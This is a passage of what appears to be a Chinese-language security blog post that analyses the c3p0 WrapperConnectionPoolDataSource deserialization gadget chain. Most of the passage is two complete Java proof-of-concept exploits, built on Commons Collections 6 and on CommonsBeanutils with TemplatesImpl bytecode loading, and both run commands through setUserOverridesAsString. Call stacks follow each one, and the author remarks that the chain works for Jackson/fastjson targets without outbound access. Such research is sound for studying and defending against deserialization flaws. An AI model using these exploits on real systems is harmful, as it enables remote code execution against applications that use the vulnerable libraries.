+<h2 id="wrapperconnectionpooldatasource"><a class="markdownIt-Anchor" href="#wrapperconnectionpooldatasource"></a> WrapperConnectionPoolDataSource</h2>
+<p><code>WrapperConnectionPoolDataSource#setUserOverridesAsString</code>跟进到这个类中，发现一个东西</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="built_in">this</span>.userOverridesAsString;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.eqOrBothNull(oldVal, userOverridesAsString)) &#123;</span><br><span class="line">        <span class="built_in">this</span>.vcs.fireVetoableChange(<span class="string">&quot;userOverridesAsString&quot;</span>, oldVal, userOverridesAsString);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.userOverridesAsString = userOverridesAsString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续跟进 fireVetoableChange</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fireVetoableChange</span><span class="params">(PropertyChangeEvent event)</span></span><br><span class="line">            <span class="keyword">throws</span> PropertyVetoException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">oldValue</span> <span class="operator">=</span> event.getOldValue();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">newValue</span> <span class="operator">=</span> event.getNewValue();</span><br><span class="line">        <span class="keyword">if</span> (oldValue == <span class="literal">null</span> || newValue == <span class="literal">null</span> || !oldValue.equals(newValue)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> event.getPropertyName();</span><br><span class="line"></span><br><span class="line">            VetoableChangeListener[] common = <span class="built_in">this</span>.map.get(<span class="literal">null</span>);</span><br><span class="line">            VetoableChangeListener[] named = (name != <span class="literal">null</span>)</span><br><span class="line">                        ? <span class="built_in">this</span>.map.get(name)</span><br><span class="line">                        : <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            VetoableChangeListener[] listeners;</span><br><span class="line">            <span class="keyword">if</span> (common == <span class="literal">null</span>) &#123;</span><br><span class="line">                listeners = named;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (named == <span class="literal">null</span>) &#123;</span><br><span class="line">                listeners = common;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                listeners = <span class="keyword">new</span> <span class="title class_">VetoableChangeListener</span>[common.length + named.length];</span><br><span class="line">                System.arraycopy(common, <span class="number">0</span>, listeners, <span class="number">0</span>, common.length);</span><br><span class="line">                System.arraycopy(named, <span class="number">0</span>, listeners, common.length, named.length);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (listeners != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> (current &lt; listeners.length) &#123;</span><br><span class="line">                        listeners[current].vetoableChange(event);</span><br><span class="line">                        current++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (PropertyVetoException veto) &#123;</span><br><span class="line">                    event = <span class="keyword">new</span> <span class="title class_">PropertyChangeEvent</span>(<span class="built_in">this</span>.source, name, newValue, oldValue);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; current; i++) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            listeners[i].vetoableChange(event);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">catch</span> (PropertyVetoException exception) &#123;</span><br><span class="line">                            <span class="comment">// ignore exceptions that occur during rolling back</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">throw</span> veto; <span class="comment">// rethrow the veto exception</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="../images/6-176170555916810.png" alt="img" /></p>
+<p>vetoableChange 这里监听事件会直接到 parseUserOverridesAsString</p>
+<p><img src="../images/7-176170558142013.png" alt="img" /></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">parseUserOverridesAsString</span><span class="params">(String userOverridesAsString)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (userOverridesAsString != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hexAscii</span> <span class="operator">=</span> userOverridesAsString.substring(<span class="string">&quot;HexAsciiSerializedMap&quot;</span>.length() + <span class="number">1</span>, userOverridesAsString.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="type">byte</span>[] serBytes = ByteUtils.fromHexAscii(hexAscii);</span><br><span class="line">        <span class="keyword">return</span> Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>处理 hexAscii 的时候会跳过头部和尾部，也就是截断，跟进到 fromByteArray 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] var0)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var1</span> <span class="operator">=</span> deserializeFromByteArray(var0);</span><br><span class="line">    <span class="keyword">return</span> var1 <span class="keyword">instanceof</span> IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>就到了 getObject 了，而这条利用链就被串起来了，并且也不需要找什么触发 setter 的玩意，可以用于 jackson、fastjson 不出网的情况</p>
+<p>可以以 CC6、CB、fastjson 为例子</p>
+<h3 id="cc6poc"><a class="markdownIt-Anchor" href="#cc6poc"></a> CC6Poc</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.lang.ByteUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0WrapperPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] realTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;pwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, realTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">hexPayload</span> <span class="operator">=</span> ByteUtils.toHexAscii(baos.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">c3p0Payload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span> + hexPayload + <span class="string">&quot;!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">WrapperConnectionPoolDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WrapperConnectionPoolDataSource</span>();</span><br><span class="line">        dataSource.setUserOverridesAsString(c3p0Payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:<span class="number">158</span>)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.getValue(TiedMapEntry.java:<span class="number">74</span>)</span><br><span class="line">at org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode(TiedMapEntry.java:<span class="number">121</span>)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:<span class="number">338</span>)</span><br><span class="line">at java.util.HashMap.readObject(HashMap.java:<span class="number">1397</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">497</span>)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:<span class="number">1058</span>)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:<span class="number">1900</span>)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">1801</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1351</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:<span class="number">371</span>)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.deserializeFromByteArray(SerializableUtils.java:<span class="number">144</span>)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.fromByteArray(SerializableUtils.java:<span class="number">123</span>)</span><br><span class="line">at com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString(C3P0ImplUtils.java:<span class="number">318</span>)</span><br><span class="line">at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource$<span class="number">1.</span>vetoableChange(WrapperConnectionPoolDataSource.java:<span class="number">110</span>)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:<span class="number">375</span>)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:<span class="number">271</span>)</span><br><span class="line">at com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase.setUserOverridesAsString(WrapperConnectionPoolDataSourceBase.java:<span class="number">387</span>)</span><br><span class="line">at org.example.Exp.C3P0WrapperPoc.main(C3P0WrapperPoc.java:<span class="number">59</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="cbpoc"><a class="markdownIt-Anchor" href="#cbpoc"></a> CBPoc</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.Exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> com.mchange.lang.ByteUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0WrapperPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(org.example.Base.Eval.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">hexPayload</span> <span class="operator">=</span> ByteUtils.toHexAscii(baos.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">c3p0Payload</span> <span class="operator">=</span> <span class="string">&quot;HexAsciiSerializedMap:&quot;</span> + hexPayload + <span class="string">&quot;!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">WrapperConnectionPoolDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WrapperConnectionPoolDataSource</span>();</span><br><span class="line">        dataSource.setUserOverridesAsString(c3p0Payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>调用栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:<span class="number">507</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">497</span>)</span><br><span class="line">at org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(PropertyUtilsBean.java:<span class="number">2128</span>)</span><br><span class="line">at org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(PropertyUtilsBean.java:<span class="number">1279</span>)</span><br><span class="line">at org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(PropertyUtilsBean.java:<span class="number">809</span>)</span><br><span class="line">at org.apache.commons.beanutils.PropertyUtilsBean.getProperty(PropertyUtilsBean.java:<span class="number">885</span>)</span><br><span class="line">at org.apache.commons.beanutils.PropertyUtils.getProperty(PropertyUtils.java:<span class="number">464</span>)</span><br><span class="line">at org.apache.commons.beanutils.BeanComparator.compare(BeanComparator.java:<span class="number">163</span>)</span><br><span class="line">at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:<span class="number">721</span>)</span><br><span class="line">at java.util.PriorityQueue.siftDown(PriorityQueue.java:<span class="number">687</span>)</span><br><span class="line">at java.util.PriorityQueue.heapify(PriorityQueue.java:<span class="number">736</span>)</span><br><span class="line">at java.util.PriorityQueue.readObject(PriorityQueue.java:<span class="number">795</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-<span class="number">1</span>)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">497</span>)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:<span class="number">1058</span>)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:<span class="number">1900</span>)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:<span class="number">1801</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:<span class="number">1351</span>)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:<span class="number">371</span>)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.deserializeFromByteArray(SerializableUtils.java:<span class="number">144</span>)</span><br><span class="line">at com.mchange.v2.ser.SerializableUtils.fromByteArray(SerializableUtils.java:<span class="number">123</span>)</span><br><span class="line">at com.mchange.v2.c3p0.impl.C3P0ImplUtils.parseUserOverridesAsString(C3P0ImplUtils.java:<span class="number">318</span>)</span><br><span class="line">at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource$<span class="number">1.</span>vetoableChange(WrapperConnectionPoolDataSource.java:<span class="number">110</span>)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:<span class="number">375</span>)</span><br><span class="line">at java.beans.VetoableChangeSupport.fireVetoableChange(VetoableChangeSupport.java:<span class="number">271</span>)</span><br><span class="line">at com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase.setUserOverridesAsString(WrapperConnectionPoolDataSourceBase.java:<span class="number">387</span>)</span><br><span class="line">at org.example.Exp.C3P0WrapperPoc.main(C3P0WrapperPoc.java:<span class="number">40</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
